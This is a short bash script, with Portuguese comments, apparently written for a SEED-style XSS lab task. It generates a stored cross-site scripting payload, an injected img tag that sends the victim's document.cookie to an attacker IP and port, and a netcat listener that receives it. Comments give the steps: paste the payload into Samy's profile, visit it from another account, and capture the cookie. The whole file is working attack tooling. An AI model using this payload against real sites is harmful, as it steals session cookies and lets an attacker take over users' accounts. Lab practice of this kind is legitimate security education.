#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ATACANTE_IP="${1:-10.9.0.1}"
PORTA="${2:-5555}"

cat > "$SCRIPT_DIR/task3_payload.html" <<EOF
<script>
document.write('<img src="http://${ATACANTE_IP}:${PORTA}/?c=' + escape(document.cookie) + '">');
</script>
EOF

cat > "$SCRIPT_DIR/task3_listener.sh" <<EOF
#!/usr/bin/env bash
set -euo pipefail

nc -lknv ${PORTA}
EOF

chmod +x "$SCRIPT_DIR/task3_listener.sh"

printf 'Gerados: task3_payload.html, task3_listener.sh\n'
printf 'Configuracao usada: atacante=%s porta=%s\n' "$ATACANTE_IP" "$PORTA"

# Testes/uso:
# - Correr ./task3_listener.sh no atacante
# - Colar task3_payload.html no perfil do Samy
# - Visitar a pagina com outra conta
# - Esperado: pedido HTTP com ?c=<cookie> no listener
